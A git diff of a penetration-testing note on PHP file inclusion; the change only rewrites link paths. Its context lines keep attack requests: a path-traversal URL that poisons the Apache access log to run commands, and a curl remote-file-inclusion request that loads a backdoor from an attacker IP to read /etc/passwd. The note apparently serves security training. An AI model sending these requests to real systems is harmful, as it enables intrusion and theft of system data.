@@ -17,15 +17,15 @@ allow_url_include = Off
 ```bash
 http://192.168.45.125/index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=whoami
 ```
-If vulnerable → [ReverseShell](../98_weaponization/ReverseShell.md)
+If vulnerable → [ReverseShell](ReverseShell.md)
 
 ```zsh
 curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.45.204/simple-backdoor.php&cmd=cat%20/etc/passwd"
 ```
 #### Example:
-- [ RFI Using an Existing Web Shell File](../99_attack_repo/01-50_web/web_lfi_executing-a-command.md)
--  [Using Pentestmonkey](../99_attack_repo/01-50_web/web_lfi_executing-a-command.md)
- [5_php_wrapper](../97_tools/5_php_wrapper.md)
+- [ RFI Using an Existing Web Shell File](web_lfi_executing-a-command.md)
+-  [Using Pentestmonkey](web_lfi_executing-a-command.md)
+ [5_php_wrapper](5_php_wrapper.md)
 *By using a wrapper, it is possible to bypass filters in PHP web applications or execute code by exploiting file inclusion vulnerabilities.*
 
 ---
